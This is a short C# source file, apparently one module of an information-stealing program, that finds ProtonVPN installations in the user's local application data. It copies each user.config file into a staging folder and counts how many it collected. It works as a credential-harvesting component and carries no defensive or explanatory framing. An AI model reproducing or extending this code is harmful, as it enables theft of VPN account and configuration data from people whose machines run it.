using System;
using System.IO;

namespace SHARP
{
    internal class ProtonVPN
    {
      public static void Save(string head)
      {
        string str1 = head;
        string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (ProtonVPN));
        if (!Directory.Exists(path1))
          return;
        try
        {
          foreach (string directory1 in Directory.GetDirectories(path1))
          {
            if (directory1.Contains("ProtonVPN.exe"))
            {
              foreach (string directory2 in Directory.GetDirectories(directory1))
              {
                string str2 = directory2 + "\\user.config";
                string path2 = Path.Combine(str1 + "\\VPN\\ProtonVPN", new DirectoryInfo(Path.GetDirectoryName(str2)).Name);
                if (!Directory.Exists(path2))
                {
                  Directory.CreateDirectory(path2);
                  File.Copy(str2, path2 + "\\user.config");
                  ++Counting.ProtonVPN;
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
    }
}
